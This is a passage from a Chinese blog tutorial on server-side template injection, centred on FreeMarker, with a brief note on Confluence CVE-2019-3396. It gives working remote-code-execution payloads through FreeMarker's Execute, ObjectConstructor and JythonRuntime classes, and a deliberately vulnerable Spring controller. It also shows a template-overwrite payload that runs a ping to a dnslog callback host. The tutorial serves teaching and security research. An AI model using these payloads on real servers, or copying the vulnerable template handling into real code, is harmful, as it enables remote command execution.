<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908142340601-1472158535.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908142340601-1472158535.png" alt="" width="890" height="422" loading="lazy" class="medium-zoom-image"></a></p>
<p>继续看render方法</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908143916739-984676483.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908143916739-984676483.png" alt="" width="899" height="489" loading="lazy" class="medium-zoom-image"></a></p>
<p>跟进execute方法</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908144606960-964942274.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200908144606960-964942274.png" alt="" width="904" height="511" loading="lazy" class="medium-zoom-image"></a></p>
<p>可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</p>
<h3>Confluence 未授权RCE分析（CVE-2019-3396）<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h3>
<p>根据官方文档的描述，可以看到这是由<span style="background-color: rgba(255, 255, 153, 1)"> widget Connector</span> 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的<span style="background-color: rgba(255, 255, 153, 1)">_template</span>字段</p>
<p>具体漏洞代码调试可以参考：《<a href="https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/" target="_blank" rel="noopener">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p>
<p>　　　　　　　　　　　　　《<a href="https://lucifaer.com/2019/04/16/Confluence%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-3396%EF%BC%89/#0x01-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Confluence 未授权RCE分析（CVE-2019-3396）</a>》</p>
<h2>FreeMarker<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h2>
<p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200909230452926-1382441572.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200909230452926-1382441572.png" alt="" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif; font-size: 14px"><strong>FreeMarker模板代码</strong>：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-TEtAPH"><code-line class="line-numbers-rows"></code-line>&lt;html&gt;
<code-line class="line-numbers-rows"></code-line>&lt;head&gt;
<code-line class="line-numbers-rows"></code-line>  &lt;title&gt;Welcome!&lt;/title&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/head&gt;
<code-line class="line-numbers-rows"></code-line>&lt;body&gt;　&lt;#–这是注释–&gt;
<code-line class="line-numbers-rows"></code-line>  &lt;h1&gt;Welcome ${user}!&lt;/h1&gt;
<code-line class="line-numbers-rows"></code-line>  &lt;p&gt;Our latest product:
<code-line class="line-numbers-rows"></code-line>  &lt;a href="${latestProduct.url}"&gt;${latestProduct.name}&lt;/a&gt;!
<code-line class="line-numbers-rows"></code-line>&lt;/body&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/html&gt;</code-pre></pre>
</div>
<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${...} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif">这个模板主要用于 java ，用户可以通过实现 <span style="background-color: rgba(255, 255, 153, 1)">TemplateModel</span> 来用 new 创建任意 Java 对象</span></p>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif">具体的高级内置函数定义参考《</span><a href="https://freemarker.apache.org/docs/ref_builtins_expert.html" target="_blank" rel="noopener">Seldom used and expert built-ins</a><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif">》</span></p>
<p><span style="color: rgba(51, 51, 51, 1); font-family: &quot;Varela Round&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Menlo, Monaco, monospace, &quot;Lucida Console&quot;, sans-serif, Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, &quot;Source Han Sans CN Regular&quot;, &quot;WenQuanYi Micro Hei&quot;, Arial, sans-serif"><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911000148374-491461162.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911000148374-491461162.png" alt="" width="623" height="331" loading="lazy" class="medium-zoom-image"></a></span></p>
<p>主要的用法如下：</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-X5A4Ei"><code-line class="line-numbers-rows"></code-line>&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
<code-line class="line-numbers-rows"></code-line>&lt;#assign word_wrapp ="com.acmee.freemarker.WordWrapperDirective"?new（）&gt;
<code-line class="line-numbers-rows"></code-line>&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
<code-line class="line-numbers-rows"></code-line>&lt;#assign word_wrapp_narrow ="com.acmee.freemarker.WordWrapperDirective"?new（40）&gt;</code-pre></pre>
</div>
<p><span style="color: rgba(0, 0, 0, 1); font-family: PingFangSC-Regular, Helvetica, &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, &quot;Hiragino Sans GB&quot;, &quot;Source Han Sans CN&quot;, &quot;Microsoft YaHei&quot;, STHeiti, &quot;WenQuanYi Micro Hei&quot;, sans-serif; font-size: 14px; text-align: justify">调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 <span style="background-color: rgba(255, 255, 153, 1)">Execute</span></span></p>
<p><span style="color: rgba(0, 0, 0, 1); font-family: PingFangSC-Regular, Helvetica, &quot;Helvetica Neue&quot;, &quot;Segoe UI&quot;, &quot;Hiragino Sans GB&quot;, &quot;Source Han Sans CN&quot;, &quot;Microsoft YaHei&quot;, STHeiti, &quot;WenQuanYi Micro Hei&quot;, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 1)"><span style="background-color: rgba(255, 255, 153, 1)">freemarker.template.utility</span> 里面有个<span style="background-color: rgba(255, 255, 153, 1)">Execute</span>类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-CNjzRX"><code-line class="line-numbers-rows"></code-line>&lt;#assign value="freemarker.template.utility.Execute"?new()&gt;${value("calc.exe")}</code-pre></pre>
</div>
<p><span style="background-color: rgba(255, 255, 153, 1)">freemarker.template.utility</span> 里面有个<span style="background-color: rgba(255, 255, 153, 1)">ObjectConstructor</span>类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-iNaAJn"><code-line class="line-numbers-rows"></code-line>&lt;#assign value="freemarker.template.utility.ObjectConstructor"?new()&gt;${value("java.lang.ProcessBuilder","calc.exe").start()</code-pre></pre>
</div>
<p><span style="background-color: rgba(255, 255, 153, 1)">freemarker.template.utility</span> 里面的<span style="background-color: rgba(255, 255, 153, 1)">JythonRuntime</span>，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-mxKWny"><code-line class="line-numbers-rows"></code-line>&lt;#assign value="freemarker.template.utility.JythonRuntime"?new()&gt;&lt;@value&gt;import os;os.system("calc.exe")&lt;/@value&gt;</code-pre></pre>
</div>
<p>这里使用测试代码来大概演示一下：<a href="https://github.com/hellokoding/springboot-freemarker" rel="noopener">https://github.com/hellokoding/springboot-freemarker</a></p>
<p>代码演示说明：<a href="https://hellokoding.com/spring-boot/freemarker/" rel="noopener">https://hellokoding.com/spring-boot/freemarker/</a></p>
<p><span style="color: rgba(51, 102, 255, 1)">前端代码　　——&gt;　　hello.ftl</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-tRWmHM"><code-line class="line-numbers-rows"></code-line>&lt;!DOCTYPE html&gt;
<code-line class="line-numbers-rows"></code-line>&lt;html lang="en"&gt;
<code-line class="line-numbers-rows"></code-line>&lt;head&gt;
<code-line class="line-numbers-rows"></code-line>    &lt;meta charset="UTF-8"&gt;
<code-line class="line-numbers-rows"></code-line>    &lt;title&gt;Hello ${name}!&lt;/title&gt;
<code-line class="line-numbers-rows"></code-line>    &lt;link href="/css/main.css" rel="stylesheet"&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/head&gt;
<code-line class="line-numbers-rows"></code-line>&lt;body&gt;
<code-line class="line-numbers-rows"></code-line>    &lt;h2 class="hello-title"&gt;Hello ${name}!&lt;/h2&gt;
<code-line class="line-numbers-rows"></code-line>    &lt;script src="/js/main.js"&gt;&lt;/script&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/body&gt;
<code-line class="line-numbers-rows"></code-line>&lt;/html&gt;</code-pre></pre>
</div>
<p><span style="color: rgba(51, 102, 255, 1)">后端代码　　——&gt;　　HelloController.java：</span></p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-BicPAe"><code-line class="line-numbers-rows"></code-line>package com.backendvulnerabilities.ssti;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>import freemarker.cache.MultiTemplateLoader;
<code-line class="line-numbers-rows"></code-line>import freemarker.cache.StringTemplateLoader;
<code-line class="line-numbers-rows"></code-line>import freemarker.cache.TemplateLoader;
<code-line class="line-numbers-rows"></code-line>import freemarker.template.Configuration;
<code-line class="line-numbers-rows"></code-line>import freemarker.template.Template;
<code-line class="line-numbers-rows"></code-line>import freemarker.template.TemplateException;
<code-line class="line-numbers-rows"></code-line>import freemarker.template.utility.DateUtil;
<code-line class="line-numbers-rows"></code-line>import org.springframework.beans.factory.annotation.Autowired;
<code-line class="line-numbers-rows"></code-line>import org.springframework.stereotype.Controller;
<code-line class="line-numbers-rows"></code-line>import org.springframework.ui.Model;
<code-line class="line-numbers-rows"></code-line>import org.springframework.web.bind.annotation.*;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>import javax.servlet.http.HttpServletRequest;
<code-line class="line-numbers-rows"></code-line>import javax.servlet.http.HttpServletResponse;
<code-line class="line-numbers-rows"></code-line>import java.io.IOException;
<code-line class="line-numbers-rows"></code-line>import java.io.StringWriter;
<code-line class="line-numbers-rows"></code-line>import java.util.HashMap;
<code-line class="line-numbers-rows"></code-line>import java.util.Map;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>@Controller
<code-line class="line-numbers-rows"></code-line>public class HelloController {
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    @Autowired
<code-line class="line-numbers-rows"></code-line>    private  Configuration con;
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    @GetMapping("/")
<code-line class="line-numbers-rows"></code-line>    public String index() {
<code-line class="line-numbers-rows"></code-line>        return "index";
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    @RequestMapping(value = "/hello")
<code-line class="line-numbers-rows"></code-line>    public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) {
<code-line class="line-numbers-rows"></code-line>        model.addAttribute("name", body.get("name"));
<code-line class="line-numbers-rows"></code-line>        return "hello";
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    @RequestMapping(value = "/freemarker")
<code-line class="line-numbers-rows"></code-line>    public void freemarker(@RequestParam("username") String username, HttpServletRequest httpserver,HttpServletResponse response) {
<code-line class="line-numbers-rows"></code-line>        try{
<code-line class="line-numbers-rows"></code-line>            String data = "1ooooooooooooooooooo~";
<code-line class="line-numbers-rows"></code-line>            String templateContent = "&lt;html&gt;&lt;body&gt;Hello " + username + " ${data}&lt;/body&gt;&lt;/html&gt;";
<code-line class="line-numbers-rows"></code-line>            String html = createHtmlFromString(templateContent,data);
<code-line class="line-numbers-rows"></code-line>            response.getWriter().println(html);
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>            }catch (Exception e){
<code-line class="line-numbers-rows"></code-line>                e.printStackTrace();
<code-line class="line-numbers-rows"></code-line>            }
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException {
<code-line class="line-numbers-rows"></code-line>        Configuration cfg = new Configuration();
<code-line class="line-numbers-rows"></code-line>        StringTemplateLoader stringLoader = new StringTemplateLoader();
<code-line class="line-numbers-rows"></code-line>        stringLoader.putTemplate("myTemplate",templateContent);
<code-line class="line-numbers-rows"></code-line>        cfg.setTemplateLoader(stringLoader);
<code-line class="line-numbers-rows"></code-line>        Template template = cfg.getTemplate("myTemplate","utf-8");
<code-line class="line-numbers-rows"></code-line>        Map root = new HashMap();
<code-line class="line-numbers-rows"></code-line>        root.put("data",data);
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>        StringWriter writer = new StringWriter();
<code-line class="line-numbers-rows"></code-line>        template.process(root,writer);
<code-line class="line-numbers-rows"></code-line>        return writer.toString();
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>
<code-line class="line-numbers-rows"></code-line>    @RequestMapping(value = "/template", method =  RequestMethod.POST)
<code-line class="line-numbers-rows"></code-line>    public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException {
<code-line class="line-numbers-rows"></code-line>        StringTemplateLoader stringLoader = new StringTemplateLoader();
<code-line class="line-numbers-rows"></code-line>        for(String templateKey : templates.keySet()){
<code-line class="line-numbers-rows"></code-line>            stringLoader.putTemplate(templateKey, templates.get(templateKey));
<code-line class="line-numbers-rows"></code-line>        }
<code-line class="line-numbers-rows"></code-line>        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader,
<code-line class="line-numbers-rows"></code-line>            con.getTemplateLoader()}));
<code-line class="line-numbers-rows"></code-line>        return "index";
<code-line class="line-numbers-rows"></code-line>    }
<code-line class="line-numbers-rows"></code-line>}</code-pre></pre>
</div>
<p><span style="font-size: 14px">上述代码主要编译给定的模板字符串和数据，生成HTML进行输出</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911153736602-1300404619.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911153736602-1300404619.png" alt="" width="750" height="271" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="font-size: 14px">模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</span></p>
<p>首先需要控制被攻击模板 <span style="background-color: rgba(255, 255, 153, 1)">/template</span> 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload</p>
<div class="cnblogs_code">
<pre style="font-family: &quot;Ubuntu Mono&quot;, monospace !important; font-size: 14px !important;"><code-pre class="code-pre" id="pre-AywyEE"><code-line class="line-numbers-rows"></code-line>{"hello.ftl": "&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()&gt; ${ ex(\"ping ilxwh0.dnslog.cn\") }&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\"/css/main.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\"hello-title\"&gt;Hello!&lt;/h2&gt;&lt;script src=\"/js/main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"}</code-pre></pre>
</div>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911170426315-957198191.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911170426315-957198191.png" alt="" width="599" height="211" loading="lazy" class="medium-zoom-image"></a></p>
<p><span style="font-size: 14px">关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用<span style="background-color: rgba(255, 255, 153, 1)">StringTemplateLoader</span>来加载模板内容，并使用<span style="background-color: rgba(255, 255, 153, 1)">putTemplate</span>将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 <span style="background-color: rgba(255, 255, 153, 1)">hello.ftl</span> 文件的内容，具体如下：</span></p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911171827668-2059326925.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911171827668-2059326925.png" alt="" width="869" height="249" loading="lazy" class="medium-zoom-image"></a></p>
<p>重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911173804255-14835990.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911173804255-14835990.png" alt="" width="859" height="244" loading="lazy" class="medium-zoom-image"></a></p>
<p>dnslog平台也受到了请求</p>
<p><a data-fancybox="gallery" href="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911173946071-111351701.png"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/1344396-20200911173946071-111351701.png" alt="" width="554" height="144" loading="lazy" class="medium-zoom-image"></a></p>
<h1>后言<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<p>由于本篇文章篇幅过长，容易脑壳疼，所以分为上下篇，上篇大概介绍了几种语言常见的几种模板注入，下篇分析几个cms的模板注入，包括海洋cms，74cms，ofcms等</p>
<h1>参考链接<button class="cnblogs-toc-button" title="显示目录导航" aria-expanded="false"></button></h1>
<p>《<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a>》</p>
<p>《<a href="https://www.cnblogs.com/chalan630/p/12578418.html#%E4%B8%80-%E4%BB%80%E4%B9%88%E6%98%AFssti" target="_blank" rel="noopener">SSTI(模板注入)</a>》</p>
<p>《<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">SSTI完全学习</a>》</p>
<p>《<a href="https://www.jianshu.com/p/a1d6ae580add" target="_blank" rel="noopener">flask ssti漏洞复现</a>》</p>
<p>《<a href="https://www.cnblogs.com/Xy--1/p/12841941.html" target="_blank" rel="noopener">SSTI(服务器模板注入)学习</a>》</p>
<p>《<a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">CTF SSTI(服务器模板注入)</a>》</p>
<p>《<a href="https://xz.aliyun.com/t/2308#toc-9" target="_blank" rel="noopener">用python继承链搞事情</a>》</p>
<p>《<a href="https://cloud.tencent.com/developer/article/1637529" target="_blank" rel="noopener">Python安全之SSTI——Flask/Jinja2</a>》</p>
<p>《<a href="https://xz.aliyun.com/t/7746#toc-10" target="_blank" rel="noopener">SSTI模板注入(Python+Jinja2)</a>》</p>
<p>《<a href="http://www.secwk.com/2019/10/10/10195/" target="_blank" rel="noopener">SSTI Bypass 分析</a>》</p>
<p>《<a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7" target="_blank" rel="noopener">flask之ssti模板注入</a>》</p>
<p>《<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之SSTI漏洞</a>》</p>
<p>《<a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">SSTI模板注入</a>》</p>
<p><a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="noopener">&nbsp;</a></p>
</div>
<div class="clear"></div>
<div id="blog_post_info_block" role="contentinfo">


<div id="BlogPostCategory">
    分类: 
            <a href="https://www.cnblogs.com/bmjoker/category/1828639.html" target="_blank"><span class="iconfont icon-marketing_fill"></span>源码审计</a>
</div>

    <div id="blog_post_info">
<div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(13508538,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
        <a id="green_channel_follow" onclick="follow(&#39;c73a3809-7f71-486b-a353-08d5782f1af4&#39;);" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/bmjoker/" target="_blank"><img src="./1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园_files/20190124140229.png" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="https://home.cnblogs.com/u/bmjoker/">bmjoker</a>
            <br>
            <a href="https://home.cnblogs.com/u/bmjoker/followers/">粉丝 - <span class="follower-count">604</span></a>
            <a href="https://home.cnblogs.com/u/bmjoker/followees/">关注 - <span class="following-count">21</span></a><br>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow" class="follow-tip">
                <a href="javascript:void(0);" onclick="follow(&#39;c73a3809-7f71-486b-a353-08d5782f1af4&#39;);return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(13508538,&#39;Digg&#39;)">
        <span class="diggnum" id="digg_count">26</span>
    </div>
    <div class="buryit" onclick="votePost(13508538,&#39;Bury&#39;)">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>

<script type="text/javascript">
    currentDiggType = 0;
</script></div>
    <div class="clear"></div>
    <div id="post_next_prev">

    <a href="https://www.cnblogs.com/bmjoker/p/11962585.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/bmjoker/p/11962585.html" data-featured-image="" title="发布于 2020-07-23 19:13">14. 使用IDA进行动态调试与过反调试（下）（三）</a>
    <br>
    <a href="https://www.cnblogs.com/bmjoker/p/13653563.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/bmjoker/p/13653563.html" data-featured-image="" title="发布于 2020-09-17 00:13">2. SSTI（模板注入）漏洞（cms实例篇）</a>

</div>
</div>
            </div>
            <div class="postDesc" style="display: block;">posted @ 
<span id="post-date" data-last-update-days="1012.5801371539595" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2020-09-14 09:36" aria-expanded="false">2020-09-14 09:36</span>&nbsp;
<a href="https://www.cnblogs.com/bmjoker/">bmjoker</a>&nbsp;
阅读(<span id="post_view_count">29495</span>)&nbsp;
评论(<span id="post_comment_count">4</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=13508538" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(13508538);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: &#39;&#39;, targetType: &#39;blogPost&#39;, targetId: &#39;13508538&#39;, targetLink: &#39;https://www.cnblogs.com/bmjoker/p/13508538.html&#39;, title: &#39;1. SSTI（模板注入）漏洞（入门篇）&#39; })">举报</a>
</div>
        </div>
	    
	    
    </div><!--end: topics 文章、评论容器-->
</div>

<script>
    var cb_entryId = 13508538, cb_entryCreatedDate = '2020-09-14 09:36', cb_postType = 1, cb_postTitle = '1. SSTI（模板注入）漏洞（入门篇）';
    var allowComments = true, cb_blogId = 415571, cb_blogApp = 'bmjoker', cb_blogUserGuid = 'c73a3809-7f71-486b-a353-08d5782f1af4';
    mermaidRender.render()
    markdown_highlight()
    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
    updatePostStats(
            [cb_entryId],
            function(id, count) { $("#post_view_count").text(count) },
            function(id, count) { $("#post_comment_count").text(count) });
</script>
<a id="!comments"></a>
<div id="blog-comments-placeholder"></div>
<div id="comment_form" class="commentform">
    <a name="commentform"></a>
    <div id="divCommentShow"></div>
    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#" onclick="return RefreshPage();">刷新页面</a><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#top">返回顶部</a></div>
    <div id="comment_form_container" style="visibility: visible;"><div class="login_tips">
    登录后才能查看或发表评论，立即 <a rel="nofollow" href="javascript:void(0);" class="underline" onclick="return account.login(&#39;!comments&#39;);">登录</a> 或者
    <a href="https://www.cnblogs.com/">逛逛</a> 博客园首页
</div>
</div>
    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
        <div id="cnblogs_ch"></div>
    <div id="opt_under_post"></div>
    <div id="cnblogs_c1" class="under-post-card" style="display: block;">
            <div id="div-gpt-ad-1592365906576-0" style="width: 300px; height: 250px;"></div>
    </div>
    <div id="under_post_card1"><div class="under-post-card">
